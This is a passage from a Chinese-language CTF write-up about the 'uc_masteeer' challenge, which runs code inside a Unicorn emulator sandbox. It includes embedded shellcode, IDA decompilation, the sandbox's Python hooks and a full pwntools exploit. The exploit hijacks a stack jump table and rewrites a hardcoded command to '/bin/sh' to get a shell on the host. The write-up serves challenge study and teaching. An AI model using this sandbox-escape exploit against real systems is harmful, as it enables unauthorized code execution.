</span></span><span style=display:flex><span><span style=color:#902000>char</span> TAIL_CODE[] <span style=color:#666>=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#902000>char</span> ADMIN_CODE[] <span style=color:#666>=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> uc_master_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;./uc_master.elf&#34;</span>, O_RDWR <span style=color:#666>|</span> O_CREAT);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    memset(PADDING, <span style=color:#40a070>0x90</span>, <span style=color:#40a070>0x1000</span>);
</span></span><span style=display:flex><span>    memcpy(PADDING, MAIN_CODE, <span style=color:#007020;font-weight:700>sizeof</span>(MAIN_CODE));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (write(uc_master_fd, PADDING, <span style=color:#40a070>0x1000</span>) <span style=color:#666>==</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;OK!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    memset(PADDING, <span style=color:#40a070>0x90</span>, <span style=color:#40a070>0x1000</span>);
</span></span><span style=display:flex><span>    memcpy(PADDING, ADMIN_CODE, <span style=color:#007020;font-weight:700>sizeof</span>(ADMIN_CODE));
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (write(uc_master_fd, PADDING, <span style=color:#40a070>0x1000</span>) <span style=color:#666>==</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;OK!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    memset(PADDING, <span style=color:#40a070>0x90</span>, <span style=color:#40a070>0x1000</span>);
</span></span><span style=display:flex><span>    memcpy(PADDING, TAIL_CODE, <span style=color:#007020;font-weight:700>sizeof</span>(TAIL_CODE));
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (write(uc_master_fd, PADDING, <span style=color:#40a070>0x1000</span>) <span style=color:#666>==</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;OK!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><em>本来是准备按把 elf 补齐的，但是 elf 的格式信息和分区表之类的太麻烦了，干脆就之后在 IDA 中手动指定了</em></p><p>把这个文件拖到 IDA 里面，指定基地址为 0xDEADBEEF000，创建函数，F5 一下，就可以获得这一一个主逻辑</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>__int64</span> <span style=color:#06287e>sub_DEADBEEF000</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>__int64</span> v0; <span style=color:#60a0b0;font-style:italic>// rdx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>__int64</span> v1; <span style=color:#60a0b0;font-style:italic>// rcx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>__int16</span> v3; <span style=color:#60a0b0;font-style:italic>// [rsp+Eh] [rbp-12h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>__int64</span> v4; <span style=color:#60a0b0;font-style:italic>// [rsp+10h] [rbp-10h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> v5; <span style=color:#60a0b0;font-style:italic>// [rsp+18h] [rbp-8h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  v3 <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  v4 <span style=color:#666>=</span> <span style=color:#40a070>0</span>i64;
</span></span><span style=display:flex><span>  v5 <span style=color:#666>=</span> <span style=color:#40a070>0</span>i64;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>while</span> ( <span style=color:#40a070>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    do_syscall(<span style=color:#40a070>68</span>i64, <span style=color:#4070a0>&#34;Welcome to uc_masteeer</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>1. admin test</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>2. user test</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>3. patch data</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>?: &#34;</span>);
</span></span><span style=display:flex><span>    do_syscall(<span style=color:#40a070>2</span>i64, <span style=color:#666>&amp;</span>v3);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( (_BYTE)v3 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;2&#39;</span> )
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( (_BYTE)v3 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;3&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      do_syscall(<span style=color:#40a070>7</span>i64, <span style=color:#4070a0>&#34;addr: &#34;</span>);
</span></span><span style=display:flex><span>      do_syscall(<span style=color:#40a070>8</span>i64, <span style=color:#666>&amp;</span>v4);
</span></span><span style=display:flex><span>      do_syscall(<span style=color:#40a070>7</span>i64, <span style=color:#4070a0>&#34;size: &#34;</span>);
</span></span><span style=display:flex><span>      do_syscall(<span style=color:#40a070>8</span>i64, <span style=color:#666>&amp;</span>v5);
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( v5 <span style=color:#666>&lt;=</span> <span style=color:#40a070>0xFF</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        do_syscall(<span style=color:#40a070>7</span>i64, <span style=color:#4070a0>&#34;data: &#34;</span>);
</span></span><span style=display:flex><span>        do_syscall(v5, v4);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (_BYTE)v3 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;1&#39;</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        do_syscall(<span style=color:#40a070>18</span>i64, <span style=color:#4070a0>&#34;Powerful admin &gt;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> MEMORY[<span style=color:#40a070>0xBABECAFE000</span>]();
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      do_syscall(v1, v0);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  do_syscall(<span style=color:#40a070>18</span>i64, <span style=color:#4070a0>&#34;Pathetic human &gt;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> MEMORY[<span style=color:#40a070>0xBABECAFE000</span>]();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>也就是有三个功能</p><ol><li>admin test：执行硬编码的 admin code</li><li>user test：执行用户输入的 code</li><li>patch data：可以修改栈区和 <code>0xDEADBEEF000 + 0x1000 ~ 0xDEADBEEF000 + 0x2000</code> 中的数据</li></ol><p>在 unicorn 沙盒中可以任意代码执行，但是这对读取 flag 并无帮助。整个沙盒唯一向外暴露的只有 hook_mem_access 函数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>hook_mem_access</span>(uc, access, address, size, value, user_data):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> is_admin
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> is_admin <span style=color:#007020;font-weight:700>and</span> address <span style=color:#666>==</span> <span style=color:#40a070>0xbabecafe233</span>:
</span></span><span style=display:flex><span>        is_admin <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>False</span>
</span></span><span style=display:flex><span>        cmd <span style=color:#666>=</span> uc<span style=color:#666>.</span>mem_read(value, <span style=color:#40a070>0x100</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> cmd<span style=color:#666>.</span>startswith(<span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;k33nlab&#39;</span>):
</span></span><span style=display:flex><span>            os<span style=color:#666>.</span>system(cmd[<span style=color:#40a070>7</span>:cmd<span style=color:#666>.</span>index(<span style=color:#40a070>0</span>)]<span style=color:#666>.</span>decode(<span style=color:#4070a0>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>uc<span style=color:#666>.</span>hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
</span></span></code></pre></div><p>也就是虚拟机内每次对虚拟内存进行写操作时，都会触发这个 hook，当 <code>is_admin</code> 和 <code>address ==0xbabecafe233</code> 两者成真时就会调用 system，调用的命令也是硬编码的，也就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span>&#39;</span>k33nlabecho <span>&#39;</span>,<span style=color:#40a070>27</span>h,<span>&#39;</span>more important than knowledge.<span>&#39;</span>,<span style=color:#40a070>27</span>h,<span style=color:#40a070>0</span>
</span></span></code></pre></div><p>实际就是 <code>echo 'more important than knowledge.'</code>，由于这一段地址我们可写，如果可以把这一句改写成 <code>/bin/sh\x00</code> 就可以 getshell 了。</p><p>但是注意到 hook_mem_access 中会把 is_admin 置假，而 admin_hook 才能将其置真</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>admin_hook</span>(uc, address, size, user_data):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> is_admin
</span></span><span style=display:flex><span>    is_admin <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>, ADMIN)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>uc<span style=color:#666>.</span>hook_add(UC_HOOK_CODE, admin_hook, <span style=color:#007020;font-weight:700>None</span>, admin_offset, admin_offset <span style=color:#666>+</span> <span style=color:#40a070>1</span>)
</span></span></code></pre></div><p>也就是每次执行到</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ( (_BYTE)v3 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;1&#39;</span> )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        do_syscall(<span style=color:#40a070>18</span>i64, <span style=color:#4070a0>&#34;Powerful admin &gt;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> MEMORY[<span style=color:#40a070>0xBABECAFE000</span>]();
</span></span><span style=display:flex><span>      }
</span></span></code></pre></div><p>此处时，都会将 is_admin 置真，用硬编码覆写 code + 0x1000 段，然后通过栈上的跳表调用 code + 0x1000 中的 admin 函数，admin 函数主要就是 <code>echo 'more important than knowledge.'</code>，这个函数会把 is_admin 改写为假。由于栈也是可写的，我们可以劫持跳表，让 <code>return MEMORY[0xBABECAFE000]();</code> 返回到 main 上，这样就可以保留 is_admin 为真，然后我们通过 patch 功能改写字符串 <code>'k33nlabecho ',27h,'more important than knowledge.',27h,0</code> 为 <code>'k33nlab/bin/sh\x00'</code>，然后再修改跳表，使指针指向 code + 0x1000，再调用 <code>user test</code> 就可以 getshell 了。</p><p>exp：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>CODE <span style=color:#666>=</span> <span style=color:#40a070>0xdeadbeef000</span>
</span></span><span style=display:flex><span>STACK <span style=color:#666>=</span> <span style=color:#40a070>0xbabecafe000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = remote(&#34;127.0.0.1&#34;, 1337)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process([<span style=color:#4070a0>&#39;python3&#39;</span>, <span style=color:#4070a0>&#39;uc_masteeer.py&#39;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;?: &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;addr: &#34;</span>, p64(STACK))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;size: &#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x08</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;data: &#34;</span>, p64(CODE))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;?: &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;?: &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;addr: &#34;</span>, p64(<span style=color:#40a070>0xDEADBEF0053</span>))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;size: &#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xF0</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;data: &#34;</span>, <span style=color:#4070a0>&#39;k33nlab/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;?: &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;addr: &#34;</span>, p64(STACK))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;size: &#34;</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x08</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;data: &#34;</span>, p64(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;?: &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>这场比赛还有一道 uc_goood，类似于这道题，只是把跳表移到了不可写的地方，预期解似乎是 qemu 的利用，出题人也表示会给出官方 wp，但是我没找到，能找到的好像只有 r3kapping 的非预期解，也就是通过机器码字节错位的方法来修改指令，看了一下大概理解了其意思。之后如果找到了官方 wp 我再考虑复现一下。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://chujdk.github.io/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>2025 © chuj | Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>